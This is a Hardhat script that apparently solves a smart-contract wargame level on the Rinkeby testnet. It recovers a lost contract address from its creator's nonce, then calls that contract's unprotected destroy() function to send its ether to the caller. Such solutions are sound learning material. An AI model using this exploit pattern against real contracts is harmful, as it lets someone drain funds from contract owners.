/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk');
const { ethers } = require('hardhat');
const { deployed } = require('./deployed');
const INSTANCE = "0x35AFf908743034DA901d65B5399d6A79B01f7fD1"


async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
 
  
  // STEP 1
  //---------------------------------------------------------------------
  // Deploy a smart contract to compute the address missing
  console.log(`Deploying NonceRecovery with address ${deployer.address}`)
  let NonceRecovery = await hre.ethers.getContractFactory('NonceRecovery')
  let nonceRecovery = await NonceRecovery.deploy(INSTANCE)
  await nonceRecovery.deployed()
  
  await deployed('NonceRecovery', hre.network.name, nonceRecovery.address)
  console.log("\nFunctions of NonceRecovery:")
  console.log(nonceRecovery.functions)
  //---------------------------------------------------------------------
  
  
  // STEP 2
  //---------------------------------------------------------------------
  // Get the missing address and make an instance of it
  const nonce = 1 // choose your nonce 
  const LOST_ADDRESS = await nonceRecovery.getNextAddress(nonce)
  console.log(`The address with nonce ${nonce}`)
  let SimpleToken = await hre.ethers.getContractFactory('SimpleToken')
  let simpleToken = await SimpleToken.attach(LOST_ADDRESS)

  console.log("\nFunctions of SimpleToken:")
  console.log(simpleToken.functions)
  //---------------------------------------------------------------------


  // STEP 4
  //---------------------------------------------------------------------
  // Call the "Destroy" function to recup the ether
  const gas = await simpleToken.estimateGas.destroy(deployer.address)
  console.log("Get the ether by calling destroy function...")
  const tx = await simpleToken.destroy(deployer.address, {gasLimit: gas * 2})
  await tx.wait()
  console.log("transaction confirmed !")
  //---------------------------------------------------------------------

  console.log("You win !")
  
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
